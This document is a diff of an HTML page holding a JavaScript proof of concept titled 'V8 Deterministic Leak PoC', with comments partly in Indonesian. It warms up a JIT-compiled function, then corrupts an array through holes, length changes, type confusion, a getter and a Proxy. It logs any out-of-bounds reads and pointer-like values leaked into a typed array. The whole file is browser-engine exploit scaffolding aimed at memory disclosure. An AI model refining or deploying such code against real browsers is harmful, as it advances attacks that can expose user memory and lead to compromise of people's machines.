@@ -1,6 +1,6 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>V8 FAST OOB SNAP</title>
+<title>V8 Deterministic Leak PoC</title>
 
 <pre id="log"></pre>
 <script>
@@ -9,90 +9,107 @@ const log = m => {
   console.log(m);
 };
 
-// =======================
 // TARGET
-// =======================
 function vuln(a,i){ return a[i] + 1.1; }
 
-// =======================
-// QUICK WARMUP (cukup sedikit)
-// =======================
-let base = [1.1,2.2,3.3,4.4,5.5];
-for(let i=0;i<20000;i++){
-  vuln(base, i%5);
+// WARMUP (cukup, tapi tidak berlebihan)
+function warmup(){
+  let arr = Array.from({length:20}, (_,i)=>i+0.5);
+  for(let i=0;i<50000;i++) vuln(arr, i%20);
+  return arr;
 }
 
-// =======================
-// AGGRESSIVE BREAK
-// =======================
-let arr = [1.1,2.2,3.3,4.4,5.5];
+// MUTATION (FIXED, NO RANDOM)
+function mutate(arr){
+  // create holes
+  delete arr[0];
+  delete arr[1];
+  delete arr[2];
 
-// bikin hole
-delete arr[1];
+  // shrink lalu extend
+  arr.length = 5;
+  arr[40] = 13.37;
 
-// paksa HOLEY + weird state
-arr.length = 2;
-arr[50] = 1.7976931348623157e+308;
+  // paksa type confusion
+  arr[3] = {x:1};
 
-// getter side-effect brutal
-Object.defineProperty(arr,1,{
-  get(){
-    arr.length = 0; // destroy structure
-    return 13.37;
-  }
-});
+  // getter deterministic
+  Object.defineProperty(arr,1,{
+    get(){
+      arr[10] = 99.99;
+      return 1.1;
+    }
+  });
 
-// proxy override
-arr = new Proxy(arr,{
-  get(t,p){
-    if(p==="length") t.push(99.99,88.88,77.77);
-    return Reflect.get(t,p);
-  }
-});
+  return arr;
+}
 
-// =======================
-// TYPED ARRAY (small but effective)
-// =======================
-let buf = new ArrayBuffer(0x1000);
+// MINIMAL ASSUMPTION BREAK
+function breakAssumption(a){
+  return new Proxy(a,{
+    get(t,p){
+      if(p === "length"){
+        t[20] = 77.77; // deterministic
+      }
+      return Reflect.get(t,p);
+    }
+  });
+}
+
+// TYPED ARRAY
+let buf = new ArrayBuffer(0x2000);
 let f64 = new Float64Array(buf);
 
-// isi marker
+// INIT PATTERN (penting buat deteksi)
 for(let i=0;i<f64.length;i++){
-  f64[i] = i + 0.123;
+  f64[i] = 0x41414141 + i;
 }
 
-// =======================
-// 🔥 TRIGGER (NO LOOP)
-// =======================
-log("[*] trigger...");
+// MAIN
+function run(){
+  log("[*] warmup");
+  let base = warmup();
 
-let r1 = vuln(arr,1);
-let r2 = vuln(arr,10);
-let r3 = vuln(arr,50);
+  log("[*] trigger");
 
-log("r1 = " + r1);
-log("r2 = " + r2);
-log("r3 = " + r3);
+  let arr = [...base];
+  arr = mutate(arr);
+  arr = breakAssumption(arr);
 
-// =======================
-// CHECK FAST OOB
-// =======================
-for(let i=0;i<20;i++){
-  let v = arr[arr.length + i];
-  if(v !== undefined){
-    log("OOB READ @"+(arr.length+i)+" = "+v);
+  // trigger JIT assumption
+  let r1 = vuln(arr,1);
+  let r2 = vuln(arr,10);
+  let r3 = vuln(arr,40);
+
+  log("r1=" + r1);
+  log("r2=" + r2);
+  log("r3=" + r3);
+
+  // CHECK OOB (FIXED RANGE)
+  for(let i=0;i<20;i++){
+    let idx = arr.length + i;
+    let v = arr[idx];
+    if(v !== undefined){
+      log("[OOB] idx="+idx+" val="+v);
+    }
   }
-}
 
-// =======================
-// CHECK POINTER-LIKE
-// =======================
-for(let i=0;i<20;i++){
-  let v = f64[i];
-  if(Math.abs(v) > 1e10){
-    log("PTR-LIKE in typed array: "+v+" @"+i);
+  // CHECK TYPED ARRAY CORRUPTION
+  for(let i=0;i<50;i++){
+    let v = f64[i];
+
+    // kalau berubah dari pattern awal → suspicious
+    if(v !== 0x41414141 + i){
+      log("[CORRUPTION] idx="+i+" val="+v);
+    }
+
+    if(Math.abs(v) > 1e12){
+      log("[PTR-LIKE] idx="+i+" val="+v);
+    }
   }
+
+  log("[*] done");
 }
 
-log("[*] done");
+run();
 </script>
